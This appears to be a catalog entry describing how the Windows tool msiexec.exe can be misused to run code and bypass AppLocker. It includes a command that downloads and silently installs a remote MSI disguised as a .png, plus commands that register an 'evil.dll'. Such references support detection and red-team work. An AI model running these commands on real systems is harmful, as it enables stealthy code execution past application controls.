---
name: msiexec.exe
description: Used by Windows to execute msi files
functions:
  execute:
    - description: Installs the target .MSI file silently.
      code: msiexec /quiet /i cmd.msi
    - description: Installs the target remote & renamed .MSI file silently.
      code: msiexec /q /i http://192.168.100.3/tmp/cmd.png
    - description: Calls DLLRegisterServer to register the target DLL.
      code: msiexec /y "C:\folder\evil.dll"
    - description: Calls DLLRegisterServer to un-register the target DLL.
      code: msiexec /z "C:\folder\evil.dll"
resources: 
    - resource: https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
    - resource: https://twitter.com/PhilipTsukerman/status/992021361106268161
fullpath: 
    - path: c:\windows\system32\msiexec.exe
    - path: c:\windows\sysWOW64\msiexec.exe
notes: Thanks to ? - @netbiosX, PhilipTsukerman - @PhilipTsukerman
---